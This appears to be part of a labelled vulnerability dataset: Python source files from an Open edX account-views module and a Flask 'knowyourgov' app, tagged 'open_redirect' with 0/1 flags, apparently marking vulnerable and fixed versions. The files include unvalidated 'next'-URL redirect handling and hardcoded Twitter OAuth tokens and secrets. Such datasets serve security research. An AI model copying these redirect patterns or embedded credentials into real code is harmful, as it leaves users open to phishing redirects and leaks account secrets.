    """""" Following logistration (1st or 3rd party), handle any special query string params.

    See FinishAuthView.js for details on the query string params.

    e.g. auto-enroll the user in a course, set email opt-in preference.

    This view just displays a ""Please wait"" message while AJAX calls are made to enroll the
    user in the course etc. This view is only used if a parameter like ""course_id"" is present
    during login/registration/third_party_auth. Otherwise, there is no need for it.

    Ideally this view will finish and redirect to the next step before the user even sees it.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the page was sent successfully
        HttpResponse: 302 if not logged in (redirect to login page)
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        GET /account/finish_auth/?course_id=course-v1:blah&enrollment_action=enroll

    """"""
    return render_to_response('student_account/finish_auth.html', {
        'disable_courseware_js': True,
        'disable_footer': True,
    })


def account_settings_context(request):
    """""" Context for the account settings page.

    Args:
        request: The request object.

    Returns:
        dict

    """"""
    user = request.user

    year_of_birth_options = [(unicode(year), unicode(year)) for year in UserProfile.VALID_YEARS]
    try:
        user_orders = get_user_orders(user)
    except:  # pylint: disable=bare-except
        log.exception('Error fetching order history from Otto.')
        # Return empty order list as account settings page expect a list and
        # it will be broken if exception raised
        user_orders = []

    context = {
        'auth': {},
        'duplicate_provider': None,
        'nav_hidden': True,
        'fields': {
            'country': {
                'options': list(countries),
            }, 'gender': {
                'options': [(choice[0], _(choice[1])) for choice in UserProfile.GENDER_CHOICES],  # pylint: disable=translation-of-non-string
            }, 'language': {
                'options': released_languages(),
            }, 'level_of_education': {
                'options': [(choice[0], _(choice[1])) for choice in UserProfile.LEVEL_OF_EDUCATION_CHOICES],  # pylint: disable=translation-of-non-string
            }, 'password': {
                'url': reverse('password_reset'),
            }, 'year_of_birth': {
                'options': year_of_birth_options,
            }, 'preferred_language': {
                'options': all_languages(),
            }, 'time_zone': {
                'options': TIME_ZONE_CHOICES,
            }
        },
        'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),
        'password_reset_support_link': configuration_helpers.get_value(
            'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK
        ) or settings.SUPPORT_SITE_LINK,
        'user_accounts_api_url': reverse(""accounts_api"", kwargs={'username': user.username}),
        'user_preferences_api_url': reverse('preferences_api', kwargs={'username': user.username}),
        'disable_courseware_js': True,
        'show_program_listing': ProgramsApiConfig.is_enabled(),
        'order_history': user_orders
    }

    if third_party_auth.is_enabled():
        # If the account on the third party provider is already connected with another edX account,
        # we display a message to the user.
        context['duplicate_provider'] = pipeline.get_duplicate_provider(messages.get_messages(request))

        auth_states = pipeline.get_provider_user_states(user)

        context['auth']['providers'] = [{
            'id': state.provider.provider_id,
            'name': state.provider.name,  # The name of the provider e.g. Facebook
            'connected': state.has_account,  # Whether the user's edX account is connected with the provider.
            # If the user is not connected, they should be directed to this page to authenticate
            # with the particular provider, as long as the provider supports initiating a login.
            'connect_url': pipeline.get_login_url(
                state.provider.provider_id,
                pipeline.AUTH_ENTRY_ACCOUNT_SETTINGS,
                # The url the user should be directed to after the auth process has completed.
                redirect_url=reverse('account_settings'),
            ),
            'accepts_logins': state.provider.accepts_logins,
            # If the user is connected, sending a POST request to this url removes the connection
            # information for this provider from their edX account.
            'disconnect_url': pipeline.get_disconnect_url(state.provider.provider_id, state.association_id),
            # We only want to include providers if they are either currently available to be logged
            # in with, or if the user is already authenticated with them.
        } for state in auth_states if state.provider.display_for_login or state.has_account]

    return context
/n/n/n",0,open_redirect
19,39,43b55308a6467a5b8880bb40b71ec0821cb76398,"/lms/djangoapps/student_account/views.py/n/n"""""" Views for a student's account information. """"""

import json
import logging
import urlparse
from datetime import datetime

import pytz
from django.conf import settings
from django.contrib import messages
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required
from django.core.urlresolvers import resolve, reverse
from django.http import HttpRequest, HttpResponse, HttpResponseBadRequest, HttpResponseForbidden
from django.shortcuts import redirect
from django.utils.translation import ugettext as _
from django.views.decorators.csrf import ensure_csrf_cookie
from django.views.decorators.http import require_http_methods
from django_countries import countries

import third_party_auth
from commerce.models import CommerceConfiguration
from edxmako.shortcuts import render_to_response, render_to_string
from lms.djangoapps.commerce.utils import EcommerceService
from openedx.core.djangoapps.commerce.utils import ecommerce_api_client
from openedx.core.djangoapps.external_auth.login_and_register import login as external_auth_login
from openedx.core.djangoapps.external_auth.login_and_register import register as external_auth_register
from openedx.core.djangoapps.lang_pref.api import all_languages, released_languages
from openedx.core.djangoapps.programs.models import ProgramsApiConfig
from openedx.core.djangoapps.site_configuration import helpers as configuration_helpers
from openedx.core.djangoapps.theming.helpers import is_request_in_themed_site
from openedx.core.djangoapps.user_api.accounts.api import request_password_change
from openedx.core.djangoapps.user_api.errors import UserNotFound
from openedx.core.lib.edx_api_utils import get_edx_api_data
from openedx.core.lib.time_zone_utils import TIME_ZONE_CHOICES
from openedx.features.enterprise_support.api import enterprise_customer_for_request
from student.helpers import destroy_oauth_tokens, get_next_url_for_login_page
from student.models import UserProfile
from student.views import register_user as old_register_view
from student.views import signin_user as old_login_view
from third_party_auth import pipeline
from third_party_auth.decorators import xframe_allow_whitelisted
from util.bad_request_rate_limiter import BadRequestRateLimiter
from util.date_utils import strftime_localized

AUDIT_LOG = logging.getLogger(""audit"")
log = logging.getLogger(__name__)
User = get_user_model()  # pylint:disable=invalid-name


@require_http_methods(['GET'])
@ensure_csrf_cookie
@xframe_allow_whitelisted
def login_and_registration_form(request, initial_mode=""login""):
    """"""Render the combined login/registration form, defaulting to login

    This relies on the JS to asynchronously load the actual form from
    the user_api.

    Keyword Args:
        initial_mode (string): Either ""login"" or ""register"".

    """"""
    # Determine the URL to redirect to following login/registration/third_party_auth
    redirect_to = get_next_url_for_login_page(request)
    # If we're already logged in, redirect to the dashboard
    if request.user.is_authenticated():
        return redirect(redirect_to)

    # Retrieve the form descriptions from the user API
    form_descriptions = _get_form_descriptions(request)

    # Our ?next= URL may itself contain a parameter 'tpa_hint=x' that we need to check.
    # If present, we display a login page focused on third-party auth with that provider.
    third_party_auth_hint = None
    if '?' in redirect_to:
        try:
            next_args = urlparse.parse_qs(urlparse.urlparse(redirect_to).query)
            provider_id = next_args['tpa_hint'][0]
            tpa_hint_provider = third_party_auth.provider.Registry.get(provider_id=provider_id)
            if tpa_hint_provider:
                if tpa_hint_provider.skip_hinted_login_dialog:
                    # Forward the user directly to the provider's login URL when the provider is configured
                    # to skip the dialog.
                    return redirect(
                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)
                    )
                third_party_auth_hint = provider_id
                initial_mode = ""hinted_login""
        except (KeyError, ValueError, IndexError):
            pass

    # If this is a themed site, revert to the old login/registration pages.
    # We need to do this for now to support existing themes.
    # Themed sites can use the new logistration page by setting
    # 'ENABLE_COMBINED_LOGIN_REGISTRATION' in their
    # configuration settings.
    if is_request_in_themed_site() and not configuration_helpers.get_value('ENABLE_COMBINED_LOGIN_REGISTRATION', False):
        if initial_mode == ""login"":
            return old_login_view(request)
        elif initial_mode == ""register"":
            return old_register_view(request)

    # Allow external auth to intercept and handle the request
    ext_auth_response = _external_auth_intercept(request, initial_mode)
    if ext_auth_response is not None:
        return ext_auth_response

    # Account activation message
    account_activation_messages = [
        {
            'message': message.message, 'tags': message.tags
        } for message in messages.get_messages(request) if 'account-activation' in message.tags
    ]

    # Otherwise, render the combined login/registration page
    context = {
        'data': {
            'login_redirect_url': redirect_to,
            'initial_mode': initial_mode,
            'third_party_auth': _third_party_auth_context(request, redirect_to, third_party_auth_hint),
            'third_party_auth_hint': third_party_auth_hint or '',
            'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),
            'support_link': configuration_helpers.get_value('SUPPORT_SITE_LINK', settings.SUPPORT_SITE_LINK),
            'password_reset_support_link': configuration_helpers.get_value(
                'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK
            ) or settings.SUPPORT_SITE_LINK,
            'account_activation_messages': account_activation_messages,

            # Include form descriptions retrieved from the user API.
            # We could have the JS client make these requests directly,
            # but we include them in the initial page load to avoid
            # the additional round-trip to the server.
            'login_form_desc': json.loads(form_descriptions['login']),
            'registration_form_desc': json.loads(form_descriptions['registration']),
            'password_reset_form_desc': json.loads(form_descriptions['password_reset']),
            'account_creation_allowed': configuration_helpers.get_value(
                'ALLOW_PUBLIC_ACCOUNT_CREATION', settings.FEATURES.get('ALLOW_PUBLIC_ACCOUNT_CREATION', True))
        },
        'login_redirect_url': redirect_to,  # This gets added to the query string of the ""Sign In"" button in header
        'responsive': True,
        'allow_iframing': True,
        'disable_courseware_js': True,
        'combined_login_and_register': True,
        'disable_footer': not configuration_helpers.get_value(
            'ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER',
            settings.FEATURES['ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER']
        ),
    }

    context = update_context_for_enterprise(request, context)

    return render_to_response('student_account/login_and_register.html', context)


@require_http_methods(['POST'])
def password_change_request_handler(request):
    """"""Handle password change requests originating from the account page.

    Uses the Account API to email the user a link to the password reset page.

    Note:
        The next step in the password reset process (confirmation) is currently handled
        by student.views.password_reset_confirm_wrapper, a custom wrapper around Django's
        password reset confirmation view.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the email was sent successfully
        HttpResponse: 400 if there is no 'email' POST parameter
        HttpResponse: 403 if the client has been rate limited
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        POST /account/password

    """"""

    limiter = BadRequestRateLimiter()
    if limiter.is_rate_limit_exceeded(request):
        AUDIT_LOG.warning(""Password reset rate limit exceeded"")
        return HttpResponseForbidden()

    user = request.user
    # Prefer logged-in user's email
    email = user.email if user.is_authenticated() else request.POST.get('email')

    if email:
        try:
            request_password_change(email, request.is_secure())
            user = user if user.is_authenticated() else User.objects.get(email=email)
            destroy_oauth_tokens(user)
        except UserNotFound:
            AUDIT_LOG.info(""Invalid password reset attempt"")
            # Increment the rate limit counter
            limiter.tick_bad_request_counter(request)

        return HttpResponse(status=200)
    else:
        return HttpResponseBadRequest(_(""No email address provided.""))


def update_context_for_enterprise(request, context):
    """"""
    Take the processed context produced by the view, determine if it's relevant
    to a particular Enterprise Customer, and update it to include that customer's
    enterprise metadata.
    """"""

    context = context.copy()

    sidebar_context = enterprise_sidebar_context(request)

    if sidebar_context:
        context['data']['registration_form_desc']['fields'] = enterprise_fields_only(
            context['data']['registration_form_desc']
        )
        context.update(sidebar_context)
        context['enable_enterprise_sidebar'] = True
        context['data']['hide_auth_warnings'] = True
    else:
        context['enable_enterprise_sidebar'] = False

    return context


def enterprise_fields_only(fields):
    """"""
    Take the received field definition, and exclude those fields that we don't want
    to require if the user is going to be a member of an Enterprise Customer.
    """"""
    enterprise_exclusions = configuration_helpers.get_value(
        'ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS',
        settings.ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS
    )
    return [field for field in fields['fields'] if field['name'] not in enterprise_exclusions]


def enterprise_sidebar_context(request):
    """"""
    Given the current request, render the HTML of a sidebar for the current
    logistration view that depicts Enterprise-related information.
    """"""
    enterprise_customer = enterprise_customer_for_request(request)

    if not enterprise_customer:
        return {}

    platform_name = configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)

    if enterprise_customer.branding_configuration.logo:
        enterprise_logo_url = enterprise_customer.branding_configuration.logo.url
    else:
        enterprise_logo_url = ''

    if getattr(enterprise_customer.branding_configuration, 'welcome_message', None):
        branded_welcome_template = enterprise_customer.branding_configuration.welcome_message
    else:
        branded_welcome_template = configuration_helpers.get_value(
            'ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE',
            settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE
        )

    branded_welcome_string = branded_welcome_template.format(
        start_bold=u'<b>',
        end_bold=u'</b>',
        enterprise_name=enterprise_customer.name,
        platform_name=platform_name
    )

    platform_welcome_template = configuration_helpers.get_value(
        'ENTERPRISE_PLATFORM_WELCOME_TEMPLATE',
        settings.ENTERPRISE_PLATFORM_WELCOME_TEMPLATE
    )
    platform_welcome_string = platform_welcome_template.format(platform_name=platform_name)

    context = {
        'enterprise_name': enterprise_customer.name,
        'enterprise_logo_url': enterprise_logo_url,
        'enterprise_branded_welcome_string': branded_welcome_string,
        'platform_welcome_string': platform_welcome_string,
    }

    return context


def _third_party_auth_context(request, redirect_to, tpa_hint=None):
    """"""Context for third party auth providers and the currently running pipeline.

    Arguments:
        request (HttpRequest): The request, used to determine if a pipeline
            is currently running.
        redirect_to: The URL to send the user to following successful
            authentication.
        tpa_hint (string): An override flag that will return a matching provider
            as long as its configuration has been enabled

    Returns:
        dict

    """"""
    context = {
        ""currentProvider"": None,
        ""providers"": [],
        ""secondaryProviders"": [],
        ""finishAuthUrl"": None,
        ""errorMessage"": None,
    }

    if third_party_auth.is_enabled():
        if not enterprise_customer_for_request(request):
            for enabled in third_party_auth.provider.Registry.displayed_for_login(tpa_hint=tpa_hint):
                info = {
                    ""id"": enabled.provider_id,
                    ""name"": enabled.name,
                    ""iconClass"": enabled.icon_class or None,
                    ""iconImage"": enabled.icon_image.url if enabled.icon_image else None,
                    ""loginUrl"": pipeline.get_login_url(
                        enabled.provider_id,
                        pipeline.AUTH_ENTRY_LOGIN,
                        redirect_url=redirect_to,
                    ),
                    ""registerUrl"": pipeline.get_login_url(
                        enabled.provider_id,
                        pipeline.AUTH_ENTRY_REGISTER,
                        redirect_url=redirect_to,
                    ),
                }
                context[""providers"" if not enabled.secondary else ""secondaryProviders""].append(info)

        running_pipeline = pipeline.get(request)
        if running_pipeline is not None:
            current_provider = third_party_auth.provider.Registry.get_from_pipeline(running_pipeline)

            if current_provider is not None:
                context[""currentProvider""] = current_provider.name
                context[""finishAuthUrl""] = pipeline.get_complete_url(current_provider.backend_name)

                if current_provider.skip_registration_form:
                    # As a reliable way of ""skipping"" the registration form, we just submit it automatically
                    context[""autoSubmitRegForm""] = True

        # Check for any error messages we may want to display:
        for msg in messages.get_messages(request):
            if msg.extra_tags.split()[0] == ""social-auth"":
                # msg may or may not be translated. Try translating [again] in case we are able to:
                context['errorMessage'] = _(unicode(msg))  # pylint: disable=translation-of-non-string
                break

    return context


def _get_form_descriptions(request):
    """"""Retrieve form descriptions from the user API.

    Arguments:
        request (HttpRequest): The original request, used to retrieve session info.

    Returns:
        dict: Keys are 'login', 'registration', and 'password_reset';
            values are the JSON-serialized form descriptions.

    """"""
    return {
        'login': _local_server_get('/user_api/v1/account/login_session/', request.session),
        'registration': _local_server_get('/user_api/v1/account/registration/', request.session),
        'password_reset': _local_server_get('/user_api/v1/account/password_reset/', request.session)
    }


def _local_server_get(url, session):
    """"""Simulate a server-server GET request for an in-process API.

    Arguments:
        url (str): The URL of the request (excluding the protocol and domain)
        session (SessionStore): The session of the original request,
            used to get past the CSRF checks.

    Returns:
        str: The content of the response

    """"""
    # Since the user API is currently run in-process,
    # we simulate the server-server API call by constructing
    # our own request object.  We don't need to include much
    # information in the request except for the session
    # (to get past through CSRF validation)
    request = HttpRequest()
    request.method = ""GET""
    request.session = session

    # Call the Django view function, simulating
    # the server-server API call
    view, args, kwargs = resolve(url)
    response = view(request, *args, **kwargs)

    # Return the content of the response
    return response.content


def _external_auth_intercept(request, mode):
    """"""Allow external auth to intercept a login/registration request.

    Arguments:
        request (Request): The original request.
        mode (str): Either ""login"" or ""register""

    Returns:
        Response or None

    """"""
    if mode == ""login"":
        return external_auth_login(request)
    elif mode == ""register"":
        return external_auth_register(request)


def get_user_orders(user):
    """"""Given a user, get the detail of all the orders from the Ecommerce service.

    Args:
        user (User): The user to authenticate as when requesting ecommerce.

    Returns:
        list of dict, representing orders returned by the Ecommerce service.
    """"""
    no_data = []
    user_orders = []
    commerce_configuration = CommerceConfiguration.current()
    user_query = {'username': user.username}

    use_cache = commerce_configuration.is_cache_enabled
    cache_key = commerce_configuration.CACHE_KEY + '.' + str(user.id) if use_cache else None
    api = ecommerce_api_client(user)
    commerce_user_orders = get_edx_api_data(
        commerce_configuration, 'orders', api=api, querystring=user_query, cache_key=cache_key
    )

    for order in commerce_user_orders:
        if order['status'].lower() == 'complete':
            date_placed = datetime.strptime(order['date_placed'], ""%Y-%m-%dT%H:%M:%SZ"")
            order_data = {
                'number': order['number'],
                'price': order['total_excl_tax'],
                'order_date': strftime_localized(date_placed, 'SHORT_DATE'),
                'receipt_url': EcommerceService().get_receipt_page_url(order['number']),
                'lines': order['lines'],
            }
            user_orders.append(order_data)

    return user_orders


@login_required
@require_http_methods(['GET'])
def account_settings(request):
    """"""Render the current user's account settings page.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the page was sent successfully
        HttpResponse: 302 if not logged in (redirect to login page)
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        GET /account/settings

    """"""
    return render_to_response('student_account/account_settings.html', account_settings_context(request))


@login_required
@require_http_methods(['GET'])
def finish_auth(request):  # pylint: disable=unused-argument
    """""" Following logistration (1st or 3rd party), handle any special query string params.

    See FinishAuthView.js for details on the query string params.

    e.g. auto-enroll the user in a course, set email opt-in preference.

    This view just displays a ""Please wait"" message while AJAX calls are made to enroll the
    user in the course etc. This view is only used if a parameter like ""course_id"" is present
    during login/registration/third_party_auth. Otherwise, there is no need for it.

    Ideally this view will finish and redirect to the next step before the user even sees it.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the page was sent successfully
        HttpResponse: 302 if not logged in (redirect to login page)
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        GET /account/finish_auth/?course_id=course-v1:blah&enrollment_action=enroll

    """"""
    return render_to_response('student_account/finish_auth.html', {
        'disable_courseware_js': True,
        'disable_footer': True,
    })


def account_settings_context(request):
    """""" Context for the account settings page.

    Args:
        request: The request object.

    Returns:
        dict

    """"""
    user = request.user

    year_of_birth_options = [(unicode(year), unicode(year)) for year in UserProfile.VALID_YEARS]
    try:
        user_orders = get_user_orders(user)
    except:  # pylint: disable=bare-except
        log.exception('Error fetching order history from Otto.')
        # Return empty order list as account settings page expect a list and
        # it will be broken if exception raised
        user_orders = []

    context = {
        'auth': {},
        'duplicate_provider': None,
        'nav_hidden': True,
        'fields': {
            'country': {
                'options': list(countries),
            }, 'gender': {
                'options': [(choice[0], _(choice[1])) for choice in UserProfile.GENDER_CHOICES],  # pylint: disable=translation-of-non-string
            }, 'language': {
                'options': released_languages(),
            }, 'level_of_education': {
                'options': [(choice[0], _(choice[1])) for choice in UserProfile.LEVEL_OF_EDUCATION_CHOICES],  # pylint: disable=translation-of-non-string
            }, 'password': {
                'url': reverse('password_reset'),
            }, 'year_of_birth': {
                'options': year_of_birth_options,
            }, 'preferred_language': {
                'options': all_languages(),
            }, 'time_zone': {
                'options': TIME_ZONE_CHOICES,
            }
        },
        'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),
        'password_reset_support_link': configuration_helpers.get_value(
            'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK
        ) or settings.SUPPORT_SITE_LINK,
        'user_accounts_api_url': reverse(""accounts_api"", kwargs={'username': user.username}),
        'user_preferences_api_url': reverse('preferences_api', kwargs={'username': user.username}),
        'disable_courseware_js': True,
        'show_program_listing': ProgramsApiConfig.is_enabled(),
        'order_history': user_orders
    }

    if third_party_auth.is_enabled():
        # If the account on the third party provider is already connected with another edX account,
        # we display a message to the user.
        context['duplicate_provider'] = pipeline.get_duplicate_provider(messages.get_messages(request))

        auth_states = pipeline.get_provider_user_states(user)

        context['auth']['providers'] = [{
            'id': state.provider.provider_id,
            'name': state.provider.name,  # The name of the provider e.g. Facebook
            'connected': state.has_account,  # Whether the user's edX account is connected with the provider.
            # If the user is not connected, they should be directed to this page to authenticate
            # with the particular provider, as long as the provider supports initiating a login.
            'connect_url': pipeline.get_login_url(
                state.provider.provider_id,
                pipeline.AUTH_ENTRY_ACCOUNT_SETTINGS,
                # The url the user should be directed to after the auth process has completed.
                redirect_url=reverse('account_settings'),
            ),
            'accepts_logins': state.provider.accepts_logins,
            # If the user is connected, sending a POST request to this url removes the connection
            # information for this provider from their edX account.
            'disconnect_url': pipeline.get_disconnect_url(state.provider.provider_id, state.association_id),
            # We only want to include providers if they are either currently available to be logged
            # in with, or if the user is already authenticated with them.
        } for state in auth_states if state.provider.display_for_login or state.has_account]

    return context
/n/n/n",1,open_redirect
20,106,4475d59ecc0a86316a8db34cfc5be12c6e306be6,"knowyourgov/routes/__init__.py/n/nfrom flask import Flask, url_for, render_template, request, make_response, jsonify, json, Response, redirect
import requests
from requests_oauthlib import OAuth1

from knowyourgov import app
from knowyourgov.models import Politician
from knowyourgov.scripts import insert_politicians_in_db
from knowyourgov.scripts.scraping import scrapers
# import errors

""""""Home page
""""""
@app.route('/')
def homepage():
  q = Politician.all()
  q.order('-search_count')

  politicians = []

  count = 0
  for politician in q:
    politicians.append(politician)
    count = count + 1
    if count == 8:
      break
  return render_template('home.html', politicians=politicians)

""""""About Page + Feedback
""""""
@app.route('/about')
def aboutpage():
  return render_template('about.html')

""""""Detects Location
""""""
@app.route('/getlocation')
def currentlocation():
  return render_template('getlocation.html')

""""""Politician Page
""""""
@app.route('/politicians/id/<name>')
def politician_page(name):
  name = name.lower().replace('-',' ')
  politicians = Politician.all()
  politicians.filter(""name ="", name)
  politician = list(politicians[:1])
  if politician:
    politician = politicians[0]
    # increment search count by one
    politician.search_count = politician.search_count + 1
    politician.put()
    politician.first_name, politician.last_name = politician.name.split(' ')[0:2]
    return render_template('politician.html', q = name, politician = politician, title = name)
  else:
    return render_template('politician_notfound.html', q = name)

""""""Search -> Politician Page
""""""
@app.route('/search', methods= ['POST', 'GET'] )
def search():
 # query = request.form['q']
  query = request.args.get('q').lower().replace('-',' ')
  politicians = Politician.all()
  politicians.filter(""name ="", query)
  politician = list(politicians[:1])
  if politician:
    politician = politicians[0]
    name = query.replace(' ','-')
    return redirect('/politicians/id/'+name)
  else:
    return render_template('politician_notfound.html', q = query)


""""""
   ** Error Handlers **
   404, 500 and other errors
""""""

"""""" 404 - Page
""""""
@app.errorhandler(404)
def page_not_found(error):
  return render_template('404.html'), 404

"""""" 500 - Page
""""""
@app.errorhandler(500)
def page_not_found(error):
	return render_template('500.html'), 500


""""""
   ** JSON response routes **
""""""

""""""JSON response containing information for a particular politician
""""""
@app.route('/json/politicians/<politician>')
def json_politician(politician):
  politicians = Politician.all()
  politicians.filter(""name ="", politician.lower())
  politician = None
  for p in politicians:
    politician = p
  return jsonify(name=politician.name,
    state = politician.state,
    party = politician.party,
    constituency = politician.constituency,
    wiki = politician.wiki_link,
    imageUrl = politician.image_url,
    search_count = politician.search_count
    )

""""""Politicians from a particular state
   Format: JSON
""""""
@app.route('/json/politicians/state/<state>')
def politicians_by_state(state):
  pols = Politician.all()
  pols.filter(""state ="", state.lower())
  pols.order('-search_count')

  politicians = []

  for pol in pols:
    politician = {
      'name': pol.name,
      'party': pol.party,
      'state': pol.state,
      'constituency': pol.constituency,
      'wiki': pol.wiki_link,
      'search_count': pol.search_count
    }

    politicians.append(politician)

  return jsonify(politicians = politicians)

""""""Array of datums for politicians
   Format: JSON
""""""
@app.route('/json/politicians/all')
def all_politicians():
  pols = Politician.all()

  politicians = []

  for pol in pols:
    tokens = pol.name.title().split(' ')
    politician = {
      'value': pol.name.title(),
      'tokens': tokens,
      'search_count': pol.search_count
    }

    politicians.append(politician)

  # create JSON response
  resp = Response(
    response=json.dumps(politicians),
    status=200,
    mimetype=""application/json""
  )

  return resp

""""""News articles from various news sources
   Format: JSON
""""""
@app.route('/json/<newspaper>/<query>')
def test(newspaper, query):
	hinduscraper = scrapers[newspaper]
	hinduscraper.getArticleLinks(query)
	hinduscraper.addArticleContent()
	articles = hinduscraper.getArticles()
	return jsonify(articles=articles)

""""""Tweets for a search query
   Format: JSON
""""""
@app.route('/json/tweets/search/<query>', methods=['GET'])
def tweets_search(query):
  # oauth tokens for Twitter APP
  access_token = '487593326-yu9WIClcUgs9vBWJGGgW4QC9pKedHMdm3NhhNoxe'
  access_token_secret = 'fMcsDcqTtbeM73qB7Cxo7dGKhZT9byGh7i5lKjOVscQzP'
  consumer_key = 'yd6lDwm3Ra9j7djyXHmrg'
  consumer_secret = 'BlBMf6kP98LwWepOVSypVwDi2x2782P2KQnJQomY'

  oauth = OAuth1(consumer_key,
    resource_owner_key=access_token,
    resource_owner_secret=access_token_secret,
    client_secret=consumer_secret
    )

  base_url = 'https://api.twitter.com/1.1/'
  search_url = 'search/tweets.json'
  verify_url = 'account/verify_credentials.json'
  payload = {'q': query, 'count': '5', 'lang': 'en', 'result_type': 'mixed'}

  # verify account credentials
  response = requests.get(base_url + verify_url, auth=oauth)
  if response.status_code == 200:
    response = requests.get(base_url + search_url, params=payload, auth=oauth)

    # create JSON response
    resp = Response(
      response=response.content,
      status=200,
      mimetype=""application/json""
    )
    
    return resp
  else:
    return jsonify(error=str(response.content))

""""""
   **Database errands**

""""""

""""""Creates entry for politicians in the db
    *Note* : Do not run it more than once, will create multiple entries
""""""
@app.route('/updatedb/politicians')
def update_all():
  return insert_politicians_in_db()
/n/n/n",0,open_redirect
21,107,4475d59ecc0a86316a8db34cfc5be12c6e306be6,"/knowyourgov/routes/__init__.py/n/nfrom flask import Flask, url_for, render_template, request, make_response, jsonify, json, Response
import requests
from requests_oauthlib import OAuth1

from knowyourgov import app
from knowyourgov.models import Politician
from knowyourgov.scripts import insert_politicians_in_db
from knowyourgov.scripts.scraping import scrapers
# import errors

""""""Home page
""""""
@app.route('/')
def homepage():
  q = Politician.all()
  q.order('-search_count')

  politicians = []

  count = 0
  for politician in q:
    politicians.append(politician)
    count = count + 1
    if count == 8:
      break
  return render_template('home.html', politicians=politicians)

""""""About Page + Feedback
""""""
@app.route('/about')
def aboutpage():
  return render_template('about.html')

""""""Detects Location
""""""
@app.route('/getlocation')
def currentlocation():
  return render_template('getlocation.html')

""""""Politician Page
""""""
@app.route('/politicians/id/<name>')
def politician_page(name):
  name = name.lower()
  politicians = Politician.all()
  politicians.filter(""name ="", name)
  politician = None
  for p in politicians:
    politician = p

  if politician != None:
    # increment search count by one
    politician.search_count = politician.search_count + 1
    politician.put()
    return render_template('politician.html', q = name, politician = politician)
  else:
    return render_template('politician_notfound.html', q = name)

""""""Search -> Politician Page
""""""
@app.route('/search', methods= ['POST', 'GET'] )
def search():
 # query = request.form['q']
  query = request.args.get('q').lower()
  politicians = Politician.all()
  politicians.filter(""name ="", query)
  politician = None
  
  for p in politicians:
    politician = p

  if politician != None:
    # increment search count by one
    politician.search_count = politician.search_count + 1
    politician.put()
    return render_template('politician.html', q = query, politician = politician)
  else:
    return render_template('politician_notfound.html', q = query)


""""""
   ** Error Handlers **
   404, 500 and other errors
""""""

"""""" 404 - Page
""""""
@app.errorhandler(404)
def page_not_found(error):
  return render_template('404.html'), 404

"""""" 500 - Page
""""""
@app.errorhandler(500)
def page_not_found(error):
	return render_template('500.html'), 500


""""""
   ** JSON response routes **
""""""

""""""JSON response containing information for a particular politician
""""""
@app.route('/json/politicians/<politician>')
def json_politician(politician):
  politicians = Politician.all()
  politicians.filter(""name ="", politician.lower())
  politician = None
  for p in politicians:
    politician = p
  return jsonify(name=politician.name,
    state = politician.state,
    party = politician.party,
    constituency = politician.constituency,
    wiki = politician.wiki_link,
    imageUrl = politician.image_url,
    search_count = politician.search_count
    )

""""""Politicians from a particular state
   Format: JSON
""""""
@app.route('/json/politicians/state/<state>')
def politicians_by_state(state):
  pols = Politician.all()
  pols.filter(""state ="", state.lower())
  pols.order('-search_count')

  politicians = []

  for pol in pols:
    politician = {
      'name': pol.name,
      'party': pol.party,
      'state': pol.state,
      'constituency': pol.constituency,
      'wiki': pol.wiki_link,
      'search_count': pol.search_count
    }

    politicians.append(politician)

  return jsonify(politicians = politicians)

""""""Array of datums for politicians
   Format: JSON
""""""
@app.route('/json/politicians/all')
def all_politicians():
  pols = Politician.all()

  politicians = []

  for pol in pols:
    tokens = pol.name.title().split(' ')
    politician = {
      'value': pol.name.title(),
      'tokens': tokens,
      'search_count': pol.search_count
    }

    politicians.append(politician)

  # create JSON response
  resp = Response(
    response=json.dumps(politicians),
    status=200,
    mimetype=""application/json""
  )

  return resp

""""""News articles from various news sources
   Format: JSON
""""""
@app.route('/json/<newspaper>/<query>')
def test(newspaper, query):
	hinduscraper = scrapers[newspaper]
	hinduscraper.getArticleLinks(query)
	hinduscraper.addArticleContent()
	articles = hinduscraper.getArticles()
	return jsonify(articles=articles)

""""""Tweets for a search query
   Format: JSON
""""""
@app.route('/json/tweets/search/<query>', methods=['GET'])
def tweets_search(query):
  # oauth tokens for Twitter APP
  access_token = '487593326-yu9WIClcUgs9vBWJGGgW4QC9pKedHMdm3NhhNoxe'
  access_token_secret = 'fMcsDcqTtbeM73qB7Cxo7dGKhZT9byGh7i5lKjOVscQzP'
  consumer_key = 'yd6lDwm3Ra9j7djyXHmrg'
  consumer_secret = 'BlBMf6kP98LwWepOVSypVwDi2x2782P2KQnJQomY'

  oauth = OAuth1(consumer_key,
    resource_owner_key=access_token,
    resource_owner_secret=access_token_secret,
    client_secret=consumer_secret
    )

  base_url = 'https://api.twitter.com/1.1/'
  search_url = 'search/tweets.json'
  verify_url = 'account/verify_credentials.json'
  payload = {'q': query, 'count': '5', 'lang': 'en', 'result_type': 'mixed'}

  # verify account credentials
  response = requests.get(base_url + verify_url, auth=oauth)
  if response.status_code == 200:
    response = requests.get(base_url + search_url, params=payload, auth=oauth)

    # create JSON response
    resp = Response(
      response=response.content,
      status=200,
      mimetype=""application/json""
    )
    
    return resp
  else:
